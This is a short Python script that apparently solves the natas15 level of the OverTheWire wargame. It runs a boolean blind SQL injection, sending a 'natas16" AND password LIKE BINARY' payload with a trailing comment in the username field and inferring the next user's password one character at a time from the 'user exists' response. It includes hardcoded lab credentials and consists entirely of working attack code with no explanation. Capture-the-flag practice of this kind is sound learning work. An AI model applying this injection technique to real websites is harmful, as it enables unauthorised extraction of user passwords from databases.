import requests
import string

credentials = ('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
url = 'http://natas15.natas.labs.overthewire.org/index.php'
template = 'natas16" AND password LIKE BINARY "{}%" -- '
alphabet = string.ascii_letters + string.digits


flag = ''
running = True
while running:
    found = False
    for c in alphabet:
        print(flag + c)
        r = requests.post(url, data={'username': template.format(flag + c), 'debug': '1'}, auth=credentials)

        if 'user exists' in r.text:
            flag += c
            found = True
            break

    if found == False:
        running = False

print('Done')


